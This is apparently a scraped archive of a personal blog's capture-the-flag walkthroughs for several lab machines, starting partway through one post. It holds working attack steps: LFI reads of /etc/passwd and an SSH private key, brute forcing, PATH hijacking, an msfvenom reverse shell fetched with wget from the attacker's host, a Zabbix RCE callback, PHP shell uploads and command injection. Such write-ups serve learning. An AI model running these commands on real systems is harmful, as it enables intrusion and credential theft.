polkitd:&#x2F;:&#x2F;sbin&#x2F;nologin sshd:x:74:74:Privilege-separated SSH:&#x2F;var&#x2F;empty&#x2F;sshd:&#x2F;sbin&#x2F;nologin cockpit-ws:x:997:993:User for cockpit-ws:&#x2F;:&#x2F;sbin&#x2F;nologin rpc:x:32:32:Rpcbind Daemon:&#x2F;var&#x2F;lib&#x2F;rpcbind:&#x2F;sbin&#x2F;nologin ntp:x:38:38::&#x2F;etc&#x2F;ntp:&#x2F;sbin&#x2F;nologin abrt:x:173:173::&#x2F;etc&#x2F;abrt:&#x2F;sbin&#x2F;nologin rpcuser:x:29:29:RPC Service User:&#x2F;var&#x2F;lib&#x2F;nfs:&#x2F;sbin&#x2F;nologin chrony:x:996:991::&#x2F;var&#x2F;lib&#x2F;chrony:&#x2F;sbin&#x2F;nologin tcpdump:x:72:72::&#x2F;:&#x2F;sbin&#x2F;nologin qiu:x:1000:1000:qiu:&#x2F;home&#x2F;qiu:&#x2F;bin&#x2F;bash apache:x:48:48:Apache:&#x2F;usr&#x2F;share&#x2F;httpd:&#x2F;sbin&#x2F;nologin nginx:x:995:990:Nginx web server:&#x2F;var&#x2F;lib&#x2F;nginx:&#x2F;sbin&#x2F;nologin tss:x:59:59:Account used by the tpm2-abrmd package to sandbox the tpm2-abrmd daemon:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin clevis:x:994:989:Clevis Decryption Framework unprivileged user:&#x2F;var&#x2F;cache&#x2F;clevis:&#x2F;sbin&#x2F;nologin mysql:x:27:27:MySQL Server:&#x2F;var&#x2F;lib&#x2F;mysql:&#x2F;bin&#x2F;false The user qiu also exist on the system I can access to his home directoryhttp://192.168.0.27/test.php?file=/home/qiu/.bashrc # .bashrc # Source global definitions if [ -f &#x2F;etc&#x2F;bashrc ]; then . &#x2F;etc&#x2F;bashrc fi # Uncomment the following line if you don&#39;t like systemctl&#39;s auto-paging feature: # export SYSTEMD_PAGER&#x3D; # User specific aliases and functions id_rsa keyhttp://192.168.0.27/test.php?file=/home/qiu/.ssh/id_rsa -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn NhAAAAAwEAAQAAAQEAvNjhOFOSeDHy9K5vnHSs3qTjWNehAPzT0sD3beBPVvYKQJt0AkD0 FDcWTSSF13NhbjCQm5fnzR8td4sjJMYiAl+vAKboHne0njGkBwdy5PgmcXyeZTECIGkggX 61kImUOIqtLMcjF5ti+09RGiWeSmfIDtTCjj&#x2F;+uQlokUMtdc4NOv4XGJbp7GdEWBZevien qXoXtG6j7gUgtXX1Fxlx3FPhxE3lxw&#x2F;AfZ9ib21JGlOyy8cflTlogrZPoICCXIV&#x2F;kxGK0d Zucw8rGGMc6Jv7npeQS1IXU9VnP3LWlOGFU0j+IS5SiNksRfdQ4mCN9SYhAm9mAKcZW8wS vXuDjWOLEwAAA9AS5tRmEubUZgAAAAdzc2gtcnNhAAABAQC82OE4U5J4MfL0rm+cdKzepO NY16EA&#x2F;NPSwPdt4E9W9gpAm3QCQPQUNxZNJIXXc2FuMJCbl+fNHy13iyMkxiICX68Apuge d7SeMaQHB3Lk+CZxfJ5lMQIgaSCBfrWQiZQ4iq0sxyMXm2L7T1EaJZ5KZ8gO1MKOP&#x2F;65CW iRQy11zg06&#x2F;hcYlunsZ0RYFl6+J6epehe0bqPuBSC1dfUXGXHcU+HETeXHD8B9n2JvbUka U7LLxx+VOWiCtk+ggIJchX+TEYrR1m5zDysYYxzom&#x2F;uel5BLUhdT1Wc&#x2F;ctaU4YVTSP4hLl KI2SxF91DiYI31JiECb2YApxlbzBK9e4ONY4sTAAAAAwEAAQAAAQArXIEaNdZD0vQ+Sm9G NWQcGzA4jgph96uLkNM&#x2F;X2nYRdZEz2zrt45TtfJg9CnnNo8AhhYuI8sNxkLiWAhRwUy9zs qYE7rohAPs7ukC1CsFeBUbqcmU4pPibUERes6lyXFHKlBpH7BnEz6&#x2F;BY9RuaGG5B2DikbB 8t&#x2F;CDO79q7ccfTZs+gOVRX4PW641+cZxo5&#x2F;gL3GcdJwDY4ggPwbU&#x2F;m8sYsyN1NWJ8NH00d X8THaQAEXAO6TTzPMLgwJi+0kj1UTg+D+nONfh7xeXLseST0m1p+e9C&#x2F;8rseZsSJSxoXKk CmDy69aModcpW+ZXl9NcjEwrMvJPLLKjhIUcIhNjf4ABAAAAgEr3ZKUuJquBNFPhEUgUic ivHoZH6U82VyEY2Bz24qevcVz2IcAXLBLIp+f1oiwYUVMIuWQDw6LSon8S72kk7VWiDrWz lHjRfpUwWdzdWSMY6PI7EpGVVs0qmRC&#x2F;TTqOIH+FXA66cFx3X4uOCjkzT0&#x2F;Es0uNyZ07qQ 58cGE8cKrLAAAAgQDlPajDRVfDWgOWJj+imXfpGsmo81UDaYXwklzw4VM2SfIHIAFZPaA0 acm4&#x2F;icKGPlnYWsvZCksvlUck+ti+J2RS2Mq9jmKB0AVZisFazj8qIde3SPPwtR7gBR329 JW3Db+KISMRIvdpJv+eiKQLg&#x2F;epbSdwXZi0DJoB0a15FsIAQAAAIEA0uQl0d0p3NxCyT&#x2F;+ Q6N+llf9TB5+VNjinaGu4DY6qVrSHmhkceHtXxG6h9upRtKw5BvOlSbTatlfMZYUtlZ1mL RWCU8D7v1Qn7qMflx4bldYgV8lf18sb6g&#x2F;uztWJuLpFe3Ue&#x2F;MLgeJ+2TiAw9yYoPVySNK8 uhSHa0dvveoJ8xMAAAAZcWl1QGxvY2FsaG9zdC5sb2NhbGRvbWFpbgEC -----END OPENSSH PRIVATE KEY----- wget 'http://192.168.0.27/test.php?file=/home/qiu/.ssh/id_rsa' -o id_rsa chmod 600 id_rsa sshssh qiu@192.168.0.27 -i id_rsa I’m in :D It’s too late now.Let’s see what is in the history. echo \"remarkablyawesomE\" | sudo -S dnf update sudo -i I’m root.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Victim1","slug":"CTF Victim1","date":"2022-06-27T05:48:00.000Z","updated":"2023-04-12T14:14:27.271Z","comments":true,"path":"/post/CTF Victim1.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Victim1.html","excerpt":"","text":"CTF Linux Created At : 2022-06-26 23:48 Count:281 Views 👀 :2147 Netdiscoversudo netdiscover 192.168.0.23 rustscanrustscan -a 192.168.0.23 Output: Port 80gobuster dir -u http://192.168.0.23 -w Documents/wordlist/directory-list-2.3-medium.txt -x html,php,txt Output: http://192.168.0.23/robots.txt On some pages I have this error: In the htaccess file I have this message. I think it’s a joomla server.http://192.168.0.23/htaccess.txt End - Joomla! core SEF Section. Port 9000I can use gobuster on this page because he return the error 500 (Internal server error). gobuster dir -u http://192.168.0.23:9000 -w Documents/wordlist/directory-list-2.3-medium.txt -x html,php,txt --wildcard switch Output: But: Nothing interesting. Port 8999It’s useless to run the gobuster scan on this web serveur because we already have the directories. It’s like an index of/ page. It’s an webfs/1.21 server with a cap file.I have to open it with wireshark. WPA-01.cap This is a capture of a wireless stream, with the SSID: dlinkI have to use aircrack-ng to find the password in the cap file with a directory attack. aircrack-ng -w Documents/wordlist/rockyou.txt /home/peanutstick/Downloads/WPA-01.cap The password for the SSID dlink is p4ssword. SSHI can use the user dlink to login via SSH. ssh dlink@192.168.0.23 Enum Can’t check the .bash_history.With lse.sh: There is nothing in /usr/bin/TryHarder! Uncommon setuidhttps://gtfobins.github.io/gtfobins/nohup/ I can’t use the commmand with sudo. /usr/bin/nohup /bin/sh -p -c \"sh -p &lt;$(tty) >$(tty) 2>$(tty)\" I’m root.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[]},{"title":"CTF Silky 0x01","slug":"CTF Silky 0x01","date":"2022-06-13T00:44:00.000Z","updated":"2023-04-12T14:14:27.267Z","comments":true,"path":"/post/CTF Silky 0x01.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Silky%200x01.html","excerpt":"","text":"netdiscover 192.168.0.12 rustscanrustscan -a 192.168.0.12 gobustergobuster dir -u http://192.168.0.12 -w Documents/wordlist/directory-list-2.3-medium.txt -x html,php,txt gobuster dir -u http://192.168.0.12 -w Documents/wordlist/directory-list-2.3-medium.txt -x html,php,txt http://192.168.0.12/notes.txt Ich muss unbedingt das Passwort aus der Seite entfernen, immerhin fehlen die letzten 2 Zeichen. Aber trotzdem. I really need to remove the password from the page, after all the last 2 characters are missing. But still. view-source:http://192.168.0.12/script.js// s1lKy WordlistSo the password should be at 7 charachters.Let’s create a wordlist with crunch. crunch 7 7 -t s1lKy^% > pass Hydrahydra -l silky -P pass 192.168.0.12 -t 10 -V ssh sshssh ssilky@192.168.0.12 s1lKy#5 lse /usr/bin/sky/usr/bin/sky Output: Seide ist ein tierischer Faserstoff. Sie wird aus den Kokons der Seidenraupe, der Larve des Seidenspinners, gewonnen. gezeichnet: root strings /usr/bin/sky Output: He use whoami as root, let’s create our own whoami file. cd /tmp echo \"/bin/sh\" > whoami chmod +x whoami export PATH=\"/tmp:$PATH\" /usr/bin/sky The flag:","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"bruteforce","slug":"bruteforce","permalink":"https://peanutstick.github.io/tags/bruteforce/"}]},{"title":"CTF Beelzebub","slug":"CTF Beelzebub","date":"2022-06-10T01:29:00.000Z","updated":"2023-04-12T14:14:27.257Z","comments":true,"path":"/post/CTF Beelzebub.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Beelzebub.html","excerpt":"","text":"netdiscoversudo netdiscover rustscanrustscan -a 192.168.0.24 On the port 80 we have this page: gobustergobuster dir -t 100 -u http://192.168.0.24 -w ~/Documents/wordlist/directory-list-medium.txt --wildcard switch The javascript directory is forbiden: There is a phpmyadmin page, let’s see if there is a index.php. MD5 hash echo -n beelzebub | md5sum This string is a directory. Beelzebub websiteThere is something but I can’t see it, the ip is hard coded in the website. This in a wordpress website, I should see what is in the upload directory:http://192.168.0.24/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/ If you browse to Talk To VALAK you can see this page: You can also found a password: Cookie&#x3D;b7d0eff31b9cde9a862dc157bb33ec2a; Password&#x3D;M4k3Ad3a1 I should do a scan on the word press website but it’s taking too much time to load, I will find the user on the login page of the VM.User: KrampusPassword: M4k3Ad3a1 sshssh krampus@192.168.0.24 Yes I’m in. cat .bash_history I’m will copy past this: I’m root. Flag: 8955qpasq8qq807879p75e1rr24cr1a5","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[]},{"title":"CTF Shibboleth","slug":"CTF Shibboleth","date":"2022-03-13T06:29:00.000Z","updated":"2023-04-12T14:14:27.267Z","comments":true,"path":"/post/CTF Shibboleth.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Shibboleth.html","excerpt":"","text":"/etc/hosts10.10.11.124 shibboleth.htb nmapnmap -sV shibboleth.htb PORT STATE SERVICE VERSION 80&#x2F;tcp open http Apache httpd 2.4.41 We only have an apache server. gobustergobuster dir -t 100 -u http:&#x2F;&#x2F;shibboleth.htb&#x2F; -w ~&#x2F;Documents&#x2F;wordlist&#x2F;directory-list-medium.txt &#x2F;assets (Status: 301) [Size: 317] [--&gt; http:&#x2F;&#x2F;shibboleth.htb&#x2F;assets&#x2F;] &#x2F;forms (Status: 301) [Size: 316] [--&gt; http:&#x2F;&#x2F;shibboleth.htb&#x2F;forms&#x2F;] &#x2F;server-status (Status: 403) [Size: 279] http://shibboleth.htb/forms/ In the Readme.txt we have this: Fully working PHP&#x2F;AJAX contact form script is available in the pro version of the template. You can buy it from: https:&#x2F;&#x2F;bootstrapmade.com&#x2F;flexstart-bootstrap-startup-template&#x2F; In the contact.php we have this: Unable to load the &quot;PHP Email Form&quot; Library! Subdomain listingwfuzz -c -f sub-fighter -w Documents&#x2F;wordlist&#x2F;subdomains-top1million-5000.txt -u http:&#x2F;&#x2F;shibboleth.htb&#x2F; -H &quot;Host: FUZZ.shibboleth.htb&quot; --hw 26 The –hw mean I will exclude every resultats with word 26. We also have an hint in main page. gobustergobuster dir -t 100 -u http:&#x2F;&#x2F;zabbix.shibboleth.htb -w ~&#x2F;Documents&#x2F;wordlist&#x2F;directory-list-medium.txt -k &#x2F;modules (Status: 301) [Size: 332] [--&gt; http:&#x2F;&#x2F;zabbix.shibboleth.htb&#x2F;modules&#x2F;] &#x2F;assets (Status: 301) [Size: 331] [--&gt; http:&#x2F;&#x2F;zabbix.shibboleth.htb&#x2F;assets&#x2F;] &#x2F;audio (Status: 301) [Size: 330] [--&gt; http:&#x2F;&#x2F;zabbix.shibboleth.htb&#x2F;audio&#x2F;] &#x2F;local (Status: 301) [Size: 330] [--&gt; http:&#x2F;&#x2F;zabbix.shibboleth.htb&#x2F;local&#x2F;] &#x2F;app (Status: 301) [Size: 328] [--&gt; http:&#x2F;&#x2F;zabbix.shibboleth.htb&#x2F;app&#x2F;] &#x2F;js (Status: 301) [Size: 327] [--&gt; http:&#x2F;&#x2F;zabbix.shibboleth.htb&#x2F;js&#x2F;] &#x2F;include (Status: 301) [Size: 332] [--&gt; http:&#x2F;&#x2F;zabbix.shibboleth.htb&#x2F;include&#x2F;] &#x2F;conf (Status: 301) [Size: 329] [--&gt; http:&#x2F;&#x2F;zabbix.shibboleth.htb&#x2F;conf&#x2F;] &#x2F;vendor (Status: 301) [Size: 331] [--&gt; http:&#x2F;&#x2F;zabbix.shibboleth.htb&#x2F;vendor&#x2F;] &#x2F;fonts (Status: 301) [Size: 330] [--&gt; http:&#x2F;&#x2F;zabbix.shibboleth.htb&#x2F;fonts&#x2F;] &#x2F;locale (Status: 301) [Size: 331] [--&gt; http:&#x2F;&#x2F;zabbix.shibboleth.htb&#x2F;locale&#x2F;] &#x2F;server-status (Status: 403) [Size: 286] It’s forbiden everywhere.I found nothing and all the new exploits of zabbix don’t work.I have to continue the enumeration. nmap UDPsudo nmap -sU nmap -sU --min-rate 5000 shibboleth.htb PORT STATE SERVICE 518&#x2F;udp closed ntalk 623&#x2F;udp open asf-rmcp 16919&#x2F;udp closed unknown 16972&#x2F;udp closed unknown 30975&#x2F;udp closed unknown 42431&#x2F;udp closed unknown 44253&#x2F;udp closed unknown The port 623 is open. Exploit IPMI (port 623)msfconsole use auxiliary&#x2F;scanner&#x2F;ipmi&#x2F;ipmi_dumphashes set RHOSTS 10.10.11.124 run ... [+] 10.10.11.124:623 - IPMI - Hash found: Administrator:5479a2ba820600003ad3a123b77e26a23ce881756019b75dec504d50007565022cf0fcdb1f86674ba123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:2d636e7b85ec1c5ab81526480df9ff2e614f4379 Crack the hashI store the hash in the hash file.I’m gonna use hashcat to crack it. hashcat -h |grep IPMI Output 7300 | IPMI2 RAKP HMAC-SHA1 | Network Protocol So the command gonna be this one. hashcat -m 7300 -a 0 hash &#x2F;home&#x2F;peanutstick&#x2F;Documents&#x2F;wordlist&#x2F;rockyou.txt I have a password. Zabbix As we can see it’s Zabbix 5.0.17.I’m gonna use this exploit.https://packetstormsecurity.com/files/166256/Zabbix-5.0.17-Remote-Code-Execution.html python3 exploit.py http:&#x2F;&#x2F;zabbix.shibboleth.htb Administrator Thepassword 10.10.14.147 4648 I’m in. Privilege escalationls &#x2F;home Output ipmi-svc So we have to connect with this user and the password we found in the hash. su ipmi-svc Enum with shellI have to upgrade the shell first. python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; Now let’s se if there is come creds in clear text. grep --color&#x3D;auto -rnw &#39;&#x2F;etc&#39; -ie &quot;Password&quot; --color&#x3D;always 2&gt; &#x2F;dev&#x2F;null Exploit mysqlCreate the payloadYou have to use an another port. msfvenom -p linux&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;10.10.14.147 LPORT&#x3D;4649 -f elf-so -o exp.so python2.7 -m SimpleHTTPServer Listen with netcat. nc -nlvp 4649 Upload the payloadOn the server mkdir &#x2F;tmp&#x2F;exp cd &#x2F;tmp&#x2F;exp wget http:&#x2F;&#x2F;10.10.14.147:8000&#x2F;exp.so Execute the payloadmysql -u zabbix -p with mysql. SET GLOBAL wsrep_provider&#x3D;&quot;&#x2F;tmp&#x2F;exp&#x2F;exp.so&quot;; I’m root. ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"bruteforce","slug":"bruteforce","permalink":"https://peanutstick.github.io/tags/bruteforce/"}]},{"title":"CTF PwnLab","slug":"CTF PwnLab","date":"2022-03-06T10:07:00.000Z","updated":"2023-04-12T14:14:27.264Z","comments":true,"path":"/post/CTF PwnLab.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20PwnLab.html","excerpt":"","text":"netdiscoversudo netdiscover 192.168.0.29 nmapnmap -sV 192.168.0.29 -p- 80, 11, 3306, 33795 port 80gobustergobuster dir -t 100 -u http:&#x2F;&#x2F;192.168.0.29&#x2F; -w ~&#x2F;Documents&#x2F;wordlist&#x2F;directory-list-medium.txt &#x2F;upload (Status: 301) [Size: 313] [--&gt; http:&#x2F;&#x2F;192.168.0.29&#x2F;upload&#x2F;] &#x2F;images (Status: 301) [Size: 313] [--&gt; http:&#x2F;&#x2F;192.168.0.29&#x2F;images&#x2F;] port 111sudo nmap -sSUC -p111 192.168.0.29 PORT STATE SERVICE 111&#x2F;tcp open rpcbind | rpcinfo: | program version port&#x2F;proto service | 100000 2,3,4 111&#x2F;tcp rpcbind | 100000 2,3,4 111&#x2F;udp rpcbind | 100000 3,4 111&#x2F;tcp6 rpcbind | 100000 3,4 111&#x2F;udp6 rpcbind | 100024 1 33795&#x2F;tcp status | 100024 1 44347&#x2F;udp6 status | 100024 1 50459&#x2F;tcp6 status |_ 100024 1 60795&#x2F;udp status 111&#x2F;udp open rpcbind | rpcinfo: | program version port&#x2F;proto service | 100000 2,3,4 111&#x2F;tcp rpcbind | 100000 2,3,4 111&#x2F;udp rpcbind | 100000 3,4 111&#x2F;tcp6 rpcbind | 100000 3,4 111&#x2F;udp6 rpcbind | 100024 1 33795&#x2F;tcp status | 100024 1 44347&#x2F;udp6 status | 100024 1 50459&#x2F;tcp6 status |_ 100024 1 60795&#x2F;udp status Nothing interesting MysqlI don’t have the creds so I can try to exploit now. Port 80 LFIhttps://blog.certcube.com/detailed-cheatsheet-lfi-rce-websheels/ It’s not working for /etc/passwd but there is a file login and upload, I can try them. curl http:&#x2F;&#x2F;192.168.0.29&#x2F;\\?page\\&#x3D;php:&#x2F;&#x2F;filter&#x2F;read\\&#x3D;convert.base64-encode&#x2F;resource\\&#x3D;login Output: &lt;html> &lt;head> &lt;title>PwnLab Intranet Image Hosting&lt;/title> &lt;/head> &lt;body> &lt;center> &lt;img src=\"images/pwnlab.png\">&lt;br /> [ &lt;a href=\"/\">Home&lt;/a> ] [ &lt;a href=\"?page=login\">Login&lt;/a> ] [ &lt;a href=\"?page=upload\">Upload&lt;/a> ] &lt;hr/>&lt;br/> PD9waHANCnNlc3Npb25fc3RhcnQoKTsNCnJlcXVpcmUoImNvbmZpZy5waHAiKTsNCiRteXNxbGkgPSBuZXcgbXlzcWxpKCRzZXJ2ZXIsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGF0YWJhc2UpOw0KDQppZiAoaXNzZXQoJF9QT1NUWyd1c2VyJ10pIGFuZCBpc3NldCgkX1BPU1RbJ3Bhc3MnXSkpDQp7DQoJJGx1c2VyID0gJF9QT1NUWyd1c2VyJ107DQoJJGxwYXNzID0gYmFzZTY0X2VuY29kZSgkX1BPU1RbJ3Bhc3MnXSk7DQoNCgkkc3RtdCA9ICRteXNxbGktPnByZXBhcmUoIlNFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgdXNlcj0/IEFORCBwYXNzPT8iKTsNCgkkc3RtdC0+YmluZF9wYXJhbSgnc3MnLCAkbHVzZXIsICRscGFzcyk7DQoNCgkkc3RtdC0+ZXhlY3V0ZSgpOw0KCSRzdG10LT5zdG9yZV9SZXN1bHQoKTsNCg0KCWlmICgkc3RtdC0+bnVtX3Jvd3MgPT0gMSkNCgl7DQoJCSRfU0VTU0lPTlsndXNlciddID0gJGx1c2VyOw0KCQloZWFkZXIoJ0xvY2F0aW9uOiA/cGFnZT11cGxvYWQnKTsNCgl9DQoJZWxzZQ0KCXsNCgkJZWNobyAiTG9naW4gZmFpbGVkLiI7DQoJfQ0KfQ0KZWxzZQ0Kew0KCT8+DQoJPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0iUE9TVCI+DQoJPGxhYmVsPlVzZXJuYW1lOiA8L2xhYmVsPjxpbnB1dCBpZD0idXNlciIgdHlwZT0idGVzdCIgbmFtZT0idXNlciI+PGJyIC8+DQoJPGxhYmVsPlBhc3N3b3JkOiA8L2xhYmVsPjxpbnB1dCBpZD0icGFzcyIgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3MiPjxiciAvPg0KCTxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj4NCgk8L2Zvcm0+DQoJPD9waHANCn0NCg==&lt;/center> &lt;/body> &lt;/html>% I have to decode it, it’s in base 64. &lt;?php session_start(); require(\"config.php\"); $mysqli = new mysqli($server, $username, $password, $database); if (isset($_POST['user']) and isset($_POST['pass'])) &#123; $luser = $_POST['user']; $lpass = base64_encode($_POST['pass']); ... We also have the file config.php. curl http:&#x2F;&#x2F;192.168.0.29&#x2F;\\?page\\&#x3D;php:&#x2F;&#x2F;filter&#x2F;read\\&#x3D;convert.base64-encode&#x2F;resource\\&#x3D;config Output: &lt;?php $server &#x3D; &quot;localhost&quot;; $username &#x3D; &quot;root&quot;; $password &#x3D; &quot;H4u%QJ_H99&quot;; $database &#x3D; &quot;Users&quot;; ?&gt; We have the creds for the mysql MysqlBrowse the databasemysql -u root -h 192.168.0.29 -p H4u%QJ_H99 show databases; +--------------------+ | Database | +--------------------+ | information_schema | | Users | +--------------------+ SHOW TABLES; +-----------------+ | Tables_in_Users | +-----------------+ | users | +-----------------+ select * from users; +------+------------------+ | user | pass | +------+------------------+ | kent | Sld6WHVCSkpOeQ&#x3D;&#x3D; | | mike | U0lmZHNURW42SQ&#x3D;&#x3D; | | kane | aVN2NVltMkdSbw&#x3D;&#x3D; | +------+------------------+ Decode the hashWe can decode them, with a base64 decoder. echo &quot;Sld6WHVCSkpOeQ&#x3D;&#x3D;&quot; | base64 --decode JWzXuBJJNy kent | JWzXuBJJNymike | SIfdsTEn6Ikane | iSv5Ym2GRo Upload a revershell Let’s upload a revershell. Ok let’s upload an image ( ͡° ͜ʖ ͡°). cp phprc.php rc.jpg It’s not working, let’s see the code of upload.php. curl http:&#x2F;&#x2F;192.168.0.29&#x2F;\\?page\\&#x3D;php:&#x2F;&#x2F;filter&#x2F;read\\&#x3D;convert.base64-encode&#x2F;resource\\&#x3D;upload ... if($imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;gif&#39; &amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;jpeg&#39; &amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;jpg&#39;&amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;png&#39;) &#123; die(&#39;Error 002&#39;); ... I have the error 002 because of the mime verification, I need to bypass it.I have to add this code in my file. GIF89aP; [shell] After the upload I change the cookie, it was hard to find this solution. I send the request an now i have a shell. GET &#x2F; HTTP&#x2F;1.1 Host: 192.168.0.29 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;98.0.4758.102 Safari&#x2F;537.36 Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9 Referer: http:&#x2F;&#x2F;192.168.0.29&#x2F; Accept-Encoding: gzip, deflate Accept-Language: fr-FR,fr;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7 Cookie: lang&#x3D;..&#x2F;upload&#x2F;29e8ea4a462331c5af3754eb8dbd4328.gif Connection: close Connect as kanepython -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; su kane iSv5Ym2GRo In the home directory we have the file msgmike it’s an executable. -rwsr-sr-x 1 mike mike 5148 Mar 17 2016 msgmike So it will run as mike.let’s see what is inside: strings ms* &#x2F;lib&#x2F;ld-linux.so.2 libc.so.6 _IO_stdin_used setregid setreuid system __libc_start_main __gmon_start__ GLIBC_2.0 PTRh QVh[ [^_] cat &#x2F;home&#x2F;mike&#x2F;msg.txt ;*2$&quot;( GCC: (Debian 4.9.2-10) 4.9.2 GCC: (Debian 4.8.4-1) 4.8.4 .symtab .strtab .shstrtab .interp .note.ABI-tag .note.gnu.build-id ... As we can see it’s using the command cat.google: exploit binaries privesc suid.https://materials.rangeforce.com/tutorial/2019/11/07/Linux-PrivEsc-SUID-Bit/ We are using cat and not whoami. echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; &#x2F;tmp&#x2F;cat chmod 777 &#x2F;tmp&#x2F;cat export PATH&#x3D;&#x2F;tmp:$PATH .&#x2F;msgmike id Output: uid&#x3D;1002(mike) gid&#x3D;1002(mike) groups&#x3D;1002(mike),1003(kane) Now let’s see what is in the home director.We have a similar programe called msg2root. strings msg2root &#x2F;bin&#x2F;echo %s &gt;&gt; &#x2F;root&#x2F;messages.txt The %s is like the $1 in bash, he need an argument.I will execute 2 cammmands, the first one is echo, the second one is /bin/sh. A; B # Run A and then B, regardless of success of A A &amp;&amp; B # Run B if and only if A succeeded A || B # Run B if and only if A failed A &amp; # Run A in background. I’m gonna use ; to execute the 2 commands. .&#x2F;msg2root sdf;&#x2F;bin&#x2F;sh id Output: uid&#x3D;1002(mike) gid&#x3D;1002(mike) euid&#x3D;0(root) egid&#x3D;0(root) groups&#x3D;0(root),1003(kane) I’m gonna display the flag.Cat is broken si I’m gonna use tail. tail &#x2F;root&#x2F;* Output: &#x3D;&#x3D;&gt; &#x2F;root&#x2F;flag.txt &lt;&#x3D;&#x3D; (__ _) this challenge. (__ _) (_ ___) (_ ___) ( _ __) Please send me your feedback or your writeup, I will love ( _ __) (__ _) reading it (__ _) (__ _) (__ _) (__ _) For sniferl4bs.com (__ _) ( _ __) claor@PwnLab.net - @Chronicoder ( _ __) (__ _) (__ _) (_ ___)-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-&#x3D;-._.-(_ ___) &#96;-._.-&#39; &#96;-._.-&#39; &#x3D;&#x3D;&gt; &#x2F;root&#x2F;messages.txt &lt;&#x3D;&#x3D; ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"database","slug":"database","permalink":"https://peanutstick.github.io/tags/database/"}]},{"title":"CTF simple CTF","slug":"CTF simple CTF","date":"2022-03-03T00:20:00.000Z","updated":"2023-04-12T14:14:27.267Z","comments":true,"path":"/post/CTF simple CTF.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20simple%20CTF.html","excerpt":"","text":"netdiscoversudo netdiscover 192.168.0.27 nmapnmap -sV 192.168.0.27 PORT STATE SERVICE VERSION 80&#x2F;tcp open http Apache httpd 2.4.7 ((Ubuntu)) Port 80http://192.168.0.27 As we can see it’s running CuteNews v.2.0.3.Les’t see if I can exploit it. https://www.exploit-db.com/exploits/37474 # Exploit : Vuln : http:&#x2F;&#x2F;127.0.0.1&#x2F;cutenews&#x2F;index.php?mod&#x3D;main&amp;opt&#x3D;personal 1 - Sign up for New User 2 - Log In 3 - Go to Personal options http:&#x2F;&#x2F;www.target.com&#x2F;cutenews&#x2F;index.php?mod&#x3D;main&amp;opt&#x3D;personal 4 - Select Upload Avatar Example: Evil.jpg 5 - use tamper data &amp; Rename File Evil.jpg to Evil.php -----------------------------2847913122899\\r\\nContent-Disposition: form-data; name&#x3D;&quot;avatar_file&quot;; filename&#x3D;&quot;Evil.php&quot;\\r\\ 6 - Your Shell : http:&#x2F;&#x2F;127.0.0.1&#x2F;cutenews&#x2F;uploads&#x2F;avatar_Username_FileName.php Example: http:&#x2F;&#x2F;127.0.0.1&#x2F;cutenews&#x2F;uploads&#x2F;avatar_toxic_Evil.php I have to register first, I’m gonna use the name user1. Download the revershellhttps://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.phpYou have to change the IP address and the port.You have to put the IP address of your computer, I always use the port 4648.Save the file as rc.jpg. Tamper data exploitOpen burpsuit.Proxy -&gt; intercept -&gt; open browser:go to this page: http://192.168.0.27/index.php?mod=main&amp;opt=personalYou have to forward to send the Request.Now send the file rc.jpg in the form. Rename the file in rc.php. You can close burpsuit now. netcatYou have to listen with netcat. nc -nlvp 4648 Now you can open the revers-shell. Now I have a shell. CVE-2015-1328uname -a Linux simple 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 